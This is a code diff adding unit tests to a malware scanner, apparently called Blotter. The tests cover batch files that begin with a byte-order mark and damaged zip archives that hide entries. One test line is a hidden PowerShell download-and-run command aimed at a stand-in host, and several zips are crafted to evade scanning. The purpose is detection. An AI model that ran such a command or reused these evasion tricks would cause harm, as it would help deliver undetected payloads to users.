@@ -1,9 +1,11 @@
 """The 0.9.0 code review's fixes: files inside archives (H1), containers Blotter can't open
 (H2), Defender switched off by another antivirus (H3), HTML smuggling, a PDF header after junk, online answers that
 expire, and Blotter's icon. Then the second review's: scripts judged by their ending, one scope per file inside, more
-containers that fail closed, the signature-check deadline, setup on ARM and the mark of the web."""
+containers that fail closed, the signature-check deadline, setup on ARM and the mark of the web. Then the re-review's:
+batch files with a byte-order mark, and files lost from a damaged zip counted by position."""
 
 import base64
+import binascii
 import bz2
 import io
 import lzma
@@ -24,6 +26,7 @@ from unittest import mock
 from blotter import config, hashing, quarantine, shortcut, worker
 from blotter.analyze import archives, filetype
 from blotter.analyze import program as program_analysis
+from blotter.analyze import scripts as script_analysis
 from blotter.cache import Cache
 from blotter.checks import archive, capabilities, defender, pdf, scripts, signature
 from blotter.checks import filetype as filetype_check
@@ -578,6 +581,117 @@ class PdfNoteTests(unittest.TestCase):
         self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "no_known_detections")
         changes = (ROOT / "CHANGES.txt").read_text(encoding="utf-8")
         self.assertIn("the note alone doesn't change the answer", changes.replace("\n", " "))
+
+
+class BatchByteOrderMarkTests(unittest.TestCase):
+    """Re-review 1: cmd.exe skips over a byte-order mark as junk on line one and runs the next line."""
+
+    LINE = b"powershell -w hidden -c iex(iwr http://blotter-test.invalid/a)\r\n"
+
+    def assert_caught(self, name, data):
+        found = scripts.scan(put(name, data))
+        self.assertIn("download-run", {f.details.get("ability") for f in found}, name)
+        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "suspicious", name)
+        inside = archive.scan(put("m.zip", samples.zip_of({name: data})))
+        self.assertIn("download-run", {f.details.get("ability") for f in inside}, name)
+        self.assertEqual(decide(inside + [ENGINE_RAN])["verdict"], "suspicious", name)
+
+    def test_utf16_marks_before_single_byte_lines(self):
+        for name in ("a.bat", "a.cmd"):
+            self.assert_caught(name, b"\xff\xfe\n" + self.LINE)  # the reviewer's exact file
+            self.assert_caught(name, b"\xff\xfe\r\n" + self.LINE)
+            self.assert_caught(name, b"\xfe\xff\r\n" + self.LINE)
+
+    def test_utf8_mark(self):
+        self.assert_caught("a.bat", b"\xef\xbb\xbf\r\n" + self.LINE)
+        self.assert_caught("a.cmd", b"\xef\xbb\xbf" + self.LINE)
+
+    def test_real_utf16_is_still_read(self):
+        self.assert_caught("a.bat", self.LINE.decode("ascii").encode("utf-16"))
+
+    def test_harmless_batch_files_stay_quiet(self):
+        for data in (b"\xff\xfe\r\necho hello\r\n", b"\xef\xbb\xbf@echo off\r\necho hello\r\n",
+                     "echo {}\r\n".format("\u041f\u0440\u0438\u0432\u0435\u0442").encode("utf-8"),
+                     "echo {}\r\n".format("\u3053\u3093\u306b\u3061\u306f").encode("shift_jis")):
+            self.assertEqual(decide(scripts.scan(put("a.bat", data)) + [ENGINE_RAN])["verdict"], "no_known_detections")
+
+    def test_other_scripts_decode_as_before(self):
+        self.assertEqual(scripts.scan(put("a.ps1", "Write-Host hi".encode("utf-16")))[0].level, CLEAR)
+        self.assertEqual(script_analysis.decode_batch(b"\xff\xfeab\xe9"), "ab\xe9")
+
+
+class LostByPositionTests(unittest.TestCase):
+    """Re-review 2: a file the walk never reached is lost, also when a file that was read has its name."""
+
+    def damaged_zip(self):
+        """a.exe, broken.txt (wrong checksum in the table, so the normal reader gives up there) and a second a.exe."""
+        data = bytearray(zip_listing(("a.exe", b"GOOD" * 10), ("broken.txt", b"x" * 50), ("a.exe", b"EVIL" * 10)))
+        with warnings.catch_warnings(), zipfile.ZipFile(io.BytesIO(bytes(data))) as z:
+            warnings.simplefilter("ignore")
+            starts = [i.header_offset for i in z.infolist()]
+        table = data.find(b"PK\x01\x02")
+        struct.pack_into("<I", data, data.find(b"PK\x01\x02", table + 4) + 16, 0x12345678)
+        return data, starts, table
+
+    def walk(self, data):
+        seen = []
+        notes = archives.walk(put("t.zip", bytes(data)), "zip", lambda name, p: seen.append(p.read_bytes()[:4]),
+                              archives.Budget())
+        return seen, notes
+
+    def test_a_header_the_walk_cant_find(self):
+        data, starts, _ = self.damaged_zip()
+        data[starts[2]:starts[2] + 4] = b"XXXX"
+        seen, notes = self.walk(data)
+        self.assertNotIn(b"EVIL", seen)
+        self.assertEqual(notes["damaged"], ["a.exe"])
+
+    def test_a_header_the_walk_jumps_over_while_calling_the_zip_complete(self):
+        """broken.txt's own header says its data runs up to the table of contents, right over the second a.exe."""
+        data, starts, table = self.damaged_zip()
+        data_start = starts[1] + 30 + len("broken.txt")
+        span = bytes(data[data_start:table])
+        struct.pack_into("<III", data, starts[1] + 14, binascii.crc32(span), len(span), len(span))
+        seen, notes = self.walk(data)
+        self.assertTrue(notes["complete"])
+        self.assertEqual(notes["damaged"], ["a.exe"])
+        found = archive.scan(put("t.zip", bytes(data)))
+        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check")
+
+    def test_a_wrong_pointer_to_the_table_doesnt_make_everything_lost(self):
+        data = bytearray(zip_listing(("a.exe", b"GOOD" * 10), ("b.txt", b"x" * 50), ("a.exe", b"EVIL" * 10)))
+        end = data.rfind(b"PK\x05\x06")
+        pointer = struct.unpack_from("<I", data, end + 16)[0]
+        struct.pack_into("<I", data, end + 16, pointer - 7)  # every position the reader works out is now 7 too far
+        seen, notes = self.walk(data)
+        self.assertEqual(sorted(seen), [b"EVIL", b"GOOD", b"xxxx"])
+        self.assertEqual(notes["damaged"], [])
+        with warnings.catch_warnings(), zipfile.ZipFile(io.BytesIO(bytes(data))) as z:
+            warnings.simplefilter("ignore")
+            last = z.infolist()[2].header_offset - 7
+        data[last:last + 4] = b"XXXX"
+        seen, notes = self.walk(data)
+        self.assertNotIn(b"EVIL", seen)
+        self.assertEqual(notes["damaged"], ["a.exe"])
+
+    def test_an_overwritten_start_names_the_right_file(self):
+        data = bytearray(zip_listing(("first.exe", b"GONE" * 10), ("second.txt", b"x" * 50)))
+        data[:4] = b"XXXX"
+        seen, notes = self.walk(data)
+        self.assertEqual(seen, [b"xxxx"])
+        self.assertEqual(notes["damaged"], ["first.exe"])
+
+    def test_nothing_is_lost_when_every_header_is_reached(self):
+        data, _, _ = self.damaged_zip()
+        seen, notes = self.walk(data)
+        self.assertEqual(sorted(seen), [b"EVIL", b"GOOD", b"xxxx"])
+        self.assertEqual(notes["damaged"], [])
+
+
+class PutBackReadmeTests(unittest.TestCase):
+    def test_readme_names_fat_and_exfat(self):
+        readme = " ".join((ROOT / "README.txt").read_text(encoding="utf-8").split())
+        self.assertIn('"Put back" can\'t restore a downloaded file to a FAT or exFAT USB stick', readme)
 
 
 if __name__ == "__main__":
